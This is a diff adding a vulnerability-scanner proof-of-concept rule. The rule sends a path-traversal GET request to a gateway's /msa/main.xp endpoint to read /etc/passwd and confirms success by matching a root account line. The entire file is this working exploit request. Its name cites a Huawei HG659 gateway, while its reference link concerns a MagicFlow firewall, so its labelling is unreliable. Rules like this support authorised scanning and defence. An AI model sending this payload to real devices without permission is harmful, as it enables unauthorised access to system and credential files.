@@ -1,0 +1,15 @@
+name: poc-yaml-huawei-home-gateway-hg659-fileread
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0()
+detail:
+    author: albertchang(https://github.com/albertchang)
+    links:
+        - http://139.224.238.245/peiqi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/MagicFlow/MagicFlow%20%E9%98%B2%E7%81%AB%E5%A2%99%E7%BD%91%E5%85%B3%20main.xp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
